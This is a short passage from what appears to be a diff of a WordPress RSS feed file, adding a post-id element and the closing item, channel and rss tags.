+									<post-id xmlns="com-wordpress:feed-additions:1">259</post-id>	</item>
+	</channel>
+</rss>
